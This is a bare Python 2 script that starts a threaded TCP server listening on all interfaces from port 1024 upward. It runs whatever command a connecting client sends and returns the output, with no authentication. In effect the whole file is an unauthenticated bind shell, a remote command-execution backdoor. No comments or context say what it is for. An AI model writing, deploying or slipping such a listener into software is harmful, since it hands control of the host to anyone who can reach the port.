import sys
import SocketServer
from threading import Thread
import threading
import atexit
import time
import subprocess
import argparse

thread_list = []


class TCPHandler(SocketServer.StreamRequestHandler):

    def handle(self):
        while True:
            try:
                self.wfile.write("> ".encode('utf-8'))
                data = self.rfile.readline().strip()
                self.rfile.flush()

                if data == 'exit':
                    return
                if data != None:
                    output = subprocess.check_output(data)
                    self.wfile.write(output)
                    data = None
            except:
                self.wfile.write("Error".encode('utf-8'))




class TCPServerThread(threading.Thread):
    def __init__(self, address):
        threading.Thread.__init__(self)
        self.data = {}
        self.data['address'] = address

    def run(self):
        port = 1024
        done = False
        while done == False:
            try:
                server = SocketServer.TCPServer((self.data['address'], port), TCPHandler)
                # print "Starting server at " + str(port) + "\n"
                server.serve_forever()
                done = True
            except SocketServer.socket.error as e:
                if e.args[0] == 98:
                    port += 1
                else:
                    print "!- Error at starting TCP thread " + self.data['address'] + ":" + str(port) + ", Error: " + str(e)

class Server():

    def start(self):
        try:

            server = TCPServerThread('0.0.0.0')

            server.daemon = True
            server.start()

        except Exception as e:
            print "!- Error at starting, Error: " + str(e)



current_server = Server()
current_server.start()

while True:
   time.sleep(1)
